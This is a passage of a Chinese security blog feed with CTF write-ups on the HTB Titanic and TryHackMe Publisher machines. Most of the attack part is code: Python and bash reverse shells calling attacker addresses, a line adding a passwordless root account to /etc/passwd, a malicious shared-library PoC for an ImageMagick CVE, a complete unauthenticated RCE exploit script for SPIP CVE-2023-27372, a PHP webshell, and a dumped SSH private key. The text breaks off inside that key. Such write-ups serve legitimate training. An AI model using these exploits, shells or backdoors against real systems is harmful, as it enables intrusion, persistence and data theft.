class="hljs-string">&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;IP\&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&#x27;&quot;</span>);<br>    <span class="hljs-comment">//exit(0);</span><br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6eaeb6dc89725367.png"></p><p>拿到 root</p><h2 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h2><p>n0o0b 师傅教的一种方法（偷师学艺），直接添加一个新的免密登录的 root 账户进去</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">echo</span> &#x27;butt3rf1y::<span class="hljs-number">0</span>:<span class="hljs-number">0</span>::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/790be3ca4fe85fb1.png"></p><p>启动服务之后都得等一会儿才有回显</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>后面还通过 <code>crontab -l</code> 可以发现执行了定时任务 <code>identify_images.sh</code> 、<code>cleanup.sh</code>、<code>revert.sh</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/a3f4753dd40765a0.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@titanic:~# cat revert.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>/usr/bin/rm /opt/app/tickets/*.json<br>/usr/bin/cp -a -r /root/images /opt/app/static/assets/<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@titanic:~# cat cleanup.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>/usr/bin/rm /opt/app/static/assets/images/libxcb.so.1<br></code></pre></td></tr></table></figure><p>一个更新 <code>/opt/app/static/assets/</code> 目录下的 <code>images/</code> 目录，一个删除 <code>/opt/app/static/assets/images/</code> 目录下的 <code>libxcb.so.1</code> 文件</p><h1 id="CVE-2024-41817"><a href="#CVE-2024-41817" class="headerlink" title="CVE-2024-41817"></a>CVE-2024-41817</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;id&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p>来分析一下这个 poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br></code></pre></td></tr></table></figure><p>通过 <code>-shared</code> 创建一个共享库，共享库名字就是 <code>./libxcb.so.1</code>，至于为什么是 <code>libxcb</code>，我觉得应该是跟 ImageMagick 功能有关，<code>libxcb</code> 是 Linux下的一个开源的面向 C 语言的图形库，它专为 X Window 窗口系统开发，它提供了用于访问 X Window 的原生 API，使得 Linux 开发者可以准确地访问 X Window 系统。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__attribute__((constructor))<br></code></pre></td></tr></table></figure><p>这是 GCC 特有的扩展，指定了 <code>init()</code> 函数在 <code>main()</code> 函数之前运行，也就是说直接先执行 <code>init()</code> 函数内容即这里的 <code>system(&quot;id&quot;)</code> ，所以这里可以执行恶意代码。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Publisher&amp;The Sticker Shop</title>
    <link href="/2025/02/14/Shop/"/>
    <url>/2025/02/14/Shop/</url>
    
    <content type="html"><![CDATA[<p>学到了学到了，一点不熟悉的提权。我好菜我好菜我好菜，靶机时间都过了重开了好几次，整理完（顺带水了个简单的）已经天亮了: (</p><span id="more"></span><h1 id="Publisher"><a href="#Publisher" class="headerlink" title="Publisher"></a>Publisher</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The “<strong>Publisher</strong>“ CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system’s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">42</span>.<span class="hljs-number">106</span><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>开放了 22 和 80</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问 <code>http</code> 服务</p><p><img src="https://img.dkdun.cn/v1/2025/12/4cc51155fb8d9ac0.png"></p><p>扫目录扫到了很多 <code>spip</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ffcdc112e84e4fcf.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/fcf7bc6c74374df0.png"></p><p>搜了一下 <code>SPIP</code> ，是一个 CMS</p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>用 msf 查找一下有没有什么漏洞</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]</span><br><span class="hljs-string">└─#</span> <span class="hljs-string">msfconsole</span> <span class="hljs-string">-q</span><br><span class="hljs-string">msf6</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">search</span> <span class="hljs-string">spip</span><br><br><span class="hljs-string">Matching</span> <span class="hljs-string">Modules</span><br><span class="hljs-string">================</span><br><br>   <span class="hljs-comment">#   Name                                             Disclosure Date  Rank       Check  Description</span><br>   <span class="hljs-bullet">-</span>   <span class="hljs-string">----</span>                                             <span class="hljs-string">---------------</span>  <span class="hljs-string">----</span>       <span class="hljs-string">-----</span>  <span class="hljs-string">-----------</span><br>   <span class="hljs-number">0</span>   <span class="hljs-string">exploit/multi/http/spip_bigup_unauth_rce</span>         <span class="hljs-number">2024-09-06       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">BigUp</span> <span class="hljs-string">Plugin</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">RCE</span><br>   <span class="hljs-number">1</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">2</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">3</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">4</span>   <span class="hljs-string">exploit/multi/http/spip_porte_plume_previsu_rce</span>  <span class="hljs-number">2024-08-16       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">RCE</span> <span class="hljs-string">via</span> <span class="hljs-string">porte_plume</span> <span class="hljs-string">Plugin</span><br>   <span class="hljs-number">5</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">6</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">7</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">8</span>   <span class="hljs-string">exploit/multi/http/spip_connect_exec</span>             <span class="hljs-number">2012-07-04       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">connect</span> <span class="hljs-string">Parameter</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Injection</span><br>   <span class="hljs-number">9</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">10</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">11</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">12</span>  <span class="hljs-string">exploit/multi/http/spip_rce_form</span>                 <span class="hljs-number">2023-02-27       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">form</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Injection</span><br>   <span class="hljs-number">13</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">14</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">15</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br><br><br><span class="hljs-string">Interact</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">module</span> <span class="hljs-string">by</span> <span class="hljs-string">name</span> <span class="hljs-string">or</span> <span class="hljs-string">index.</span> <span class="hljs-string">For</span> <span class="hljs-string">example</span> <span class="hljs-string">info</span> <span class="hljs-number">15</span><span class="hljs-string">,</span> <span class="hljs-string">use</span> <span class="hljs-number">15</span> <span class="hljs-string">or</span> <span class="hljs-string">use</span> <span class="hljs-string">exploit/multi/http/spip_rce_form</span><br><span class="hljs-string">After</span> <span class="hljs-string">interacting</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">module</span> <span class="hljs-string">you</span> <span class="hljs-string">can</span> <span class="hljs-string">manually</span> <span class="hljs-string">set</span> <span class="hljs-string">a</span> <span class="hljs-string">TARGET</span> <span class="hljs-string">with</span> <span class="hljs-string">set</span> <span class="hljs-string">TARGET</span> <span class="hljs-string">&#x27;Windows Command Shell&#x27;</span><br></code></pre></td></tr></table></figure><p>结合题目描述来看可能是这个 rce</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">12 </span> exploit/multi/http/spip_rce_form                 <span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>       excellent  Yes    SPIP form PHP Injection<br></code></pre></td></tr></table></figure><h2 id="CVE-2023-27372"><a href="#CVE-2023-27372" class="headerlink" title="CVE-2023-27372"></a>CVE-2023-27372</h2><p>搜了一下，应该是打 <code>CVE-2023-27372</code>，创建一个 <code>27372.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># Exploit Title: SPIP &lt; 4.2.1 - Remote Code Execution (Unauthenticated)</span><br><span class="hljs-comment"># Google Dork: inurl:&quot;/spip.php?page=login&quot;</span><br><span class="hljs-comment"># Date: 19/06/2023</span><br><span class="hljs-comment"># Exploit Author: nuts7</span><br><span class="hljs-comment"># Vendor Homepage: https://www.spip.net/</span><br><span class="hljs-comment"># Software Link: https://files.spip.net/spip/archives/</span><br><span class="hljs-comment"># Version: &lt; 4.2.1 (Except few fixed versions indicated in the description)</span><br><span class="hljs-comment"># Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0</span><br><span class="hljs-comment"># CVE reference : CVE-2023-27372 (coiffeur)</span><br><span class="hljs-comment"># CVSS : 9.8 (Critical)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Vulnerability Description:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.</span><br><span class="hljs-comment"># This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Usage: python3 CVE-2023-27372.py http://example.com</span><br><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> bs4<br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parseArgs</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;Poc of CVE-2023-27372 SPIP &lt; 4.2.1 - Remote Code Execution by nuts7&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;--url&quot;</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SPIP application base URL&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;--command&quot;</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Command to execute&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-v&quot;</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, default=<span class="hljs-literal">False</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Verbose mode. (default: False)&quot;</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_anticsrf</span>(<span class="hljs-params">url</span>):<br>    r = requests.get(<span class="hljs-string">&#x27;%s/spip.php?page=spip_pass&#x27;</span> % url, timeout=<span class="hljs-number">10</span>)<br>    soup = bs4.BeautifulSoup(r.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    csrf_input = soup.find(<span class="hljs-string">&#x27;input&#x27;</span>, &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;formulaire_action_args&#x27;</span>&#125;)<br>    <span class="hljs-keyword">if</span> csrf_input:<br>        csrf_value = csrf_input[<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-keyword">if</span> options.verbose:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Anti-CSRF token found : %s&quot;</span> % csrf_value)<br>        <span class="hljs-keyword">return</span> csrf_value<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unable to find Anti-CSRF token&quot;</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">url, payload</span>):<br>    data = &#123;<br>        <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-string">&quot;spip_pass&quot;</span>,<br>        <span class="hljs-string">&quot;formulaire_action&quot;</span>: <span class="hljs-string">&quot;oubli&quot;</span>,<br>        <span class="hljs-string">&quot;formulaire_action_args&quot;</span>: csrf,<br>        <span class="hljs-string">&quot;oubli&quot;</span>: payload<br>    &#125;<br>    r = requests.post(<span class="hljs-string">&#x27;%s/spip.php?page=spip_pass&#x27;</span> % url, data=data)<br>    <span class="hljs-keyword">if</span> options.verbose:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Execute this payload : %s&quot;</span> % payload)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    options = parseArgs()<br><br>    csrf = get_anticsrf(url=options.url)<br>    send_payload(url=options.url, payload=<span class="hljs-string">&quot;s:%s:\&quot;&lt;?php system(&#x27;%s&#x27;); ?&gt;\&quot;;&quot;</span> % (<span class="hljs-number">20</span> + <span class="hljs-built_in">len</span>(options.command), options.command))<br></code></pre></td></tr></table></figure><p>随便写一个 <code>webshell.php</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">96</span>.<span class="hljs-number">254</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python  27372.py -u http://10.10.42.106/spip -c &#x27;echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(\<span class="hljs-variable">$_GET</span>[\<span class="hljs-string">&quot;cmd\&quot;]); ?&gt;</span></span><span class="language-xml">&quot; &gt; webshell.php&#x27; -v</span><br></code></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d89673d178a5cf4.png"></p><p>查看有哪些用户目录，有一个 think 用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/df7b3bfcdf52a69e.png"></p><p>查看用户目录文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/5aae60656f929434.png"></p><p>访问<code>/user.txt</code> 拿到第一个 user flag </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">fa229046d44eda6a3598c73ad96f4ca5  <br></code></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>发现有 <code>.ssh</code>，访问 <code>/home/think/.ssh </code>拿到私钥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cmd">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK<br>uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+<span class="hljs-number">9</span>/<span class="hljs-number">2</span>ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc<br>OY8+<span class="hljs-number">1</span>CUVX67y4UXrKASf8l7lPKIED24bXjkDBkVrCMHwScQbg/nIIFxyi262JoJTjh9Jgx<br>SBjaDOELBBxydv78YMN9dyafImAXYX96H5k+<span class="hljs-number">8</span>vC8/I3bkwiCnhuKKJ11TV4b8lMsbrgqbY<br>RYfbCJapB27zJ24a1aR5Un+Ec2XV2fawhmftS05b10M0QAnDEu7SGXG9mF/hLJyheRe8lv<br>+rk5EkZNgh14YpXG/E9yIbxB9Rf5k0ekxodZjVV06iqIHBomcQrKotV5nXBRPgVeH71JgV<br>QFkNQyqVM4wf6oODSqQsuIvnkB5l9e095sJDwz1pj/aTL3Z6Z28KgPKCjOELvkAPcncuMQ<br>Tu+z6QVUr0cCjgSRhw4Gy/bfJ4lLyX/bciL5QoydAAAFiD95i1o/eYtaAAAAB3NzaC1yc2<br>EAAAGBAMT73PaYo6VCQOKJcr5FtK8mAEgaXZgWrDhJbOjkcOxTIIz1vOrQyriF8mZ3gSFG<br>qyYmYfFcxapikWHIqA8JSc6vvf9oqUB01czY8cYNfMFrxdFpytpSOU0O0F3DmPPtQlFV+u<br><span class="hljs-number">8</span>uFF6ygEn/Je5TyiBA9uG145AwZFawjB8EnEG4P5yCBccotutiaCU44fSYMUgY2gzhCwQc<br>cnb+/GDDfXcmnyJgF2F/eh+ZPvLwvPyN25MIgp4biiiddU1eG/JTLG64Km2EWH2wiWqQdu<br><span class="hljs-number">8</span>yduGtWkeVJ/hHNl1dn2sIZn7UtOW9dDNEAJwxLu0hlxvZhf4SycoXkXvJb/q5ORJGTYId<br>eGKVxvxPciG8QfUX+ZNHpMaHWY1VdOoqiBwaJnEKyqLVeZ1wUT4FXh+<span class="hljs-number">9</span>SYFUBZDUMqlTOM<br>H+qDg0qkLLiL55AeZfXtPebCQ8M9aY/<span class="hljs-number">2</span>ky92emdvCoDygozhC75AD3J3LjEE7vs+kFVK9H<br>Ao4EkYcOBsv23yeJS8l/<span class="hljs-number">23</span>Ii+UKMnQAAAAMBAAEAAAGBAIIasGkXjA6c4eo+SlEuDRcaDF<br>mTQHoxj3Jl3M8+Au+<span class="hljs-number">0</span>P+<span class="hljs-number">2</span>aaTrWyO5zWhUfnWRzHpvGAi6+zbep/sgNFiNIST2AigdmA1QV<br>VxlDuPzM77d5DWExdNAaOsqQnEMx65ZBAOpj1aegUcfyMhWttknhgcEn52hREIqty7gOR5<br><span class="hljs-number">49</span>F0+<span class="hljs-number">4</span>+BrRLivK0nZJuuvK1EMPOo2aDHsxMGt4tomuBNeMhxPpqHW17ftxjSHNv+wJ4WkV<br><span class="hljs-number">8</span>Q7+MfdnzSriRRXisKavE6MPzYHJtMEuDUJDUtIpXVx2rl/L3DBs1GGES1Qq5vWwNGOkLR<br>zz2F+<span class="hljs-number">3</span>dNNzK6d0e18ciUXF0qZxFzF+hqwxi6jCASFg6A0YjcozKl1WdkUtqqw+Mf15q+KW<br>xlkL1XnW4/jPt3tb4A9UsW/ayOLCGrlvMwlonGq+s+<span class="hljs-number">0</span>nswZNAIDvKKIzzbqvBKZMfVZl4Q<br>UafNbJoLlXm+<span class="hljs-number">4</span>lshdBSRVHPe81IYS8C+<span class="hljs-number">1</span>foyX+f1HRkodpkGE0/<span class="hljs-number">4</span>/StcGv4XiRBFG1qQAA<br>AMEAsFmX8iE4UuNEmz467uDcvLP53P9E2nwjYf65U4ArSijnPY0GRIu8ZQkyxKb4V5569l<br>DbOLhbfRF/KTRO7nWKqo4UUoYvlRg4MuCwiNsOTWbcNqkPWllD0dGO7IbDJ1uCJqNjV+OE<br><span 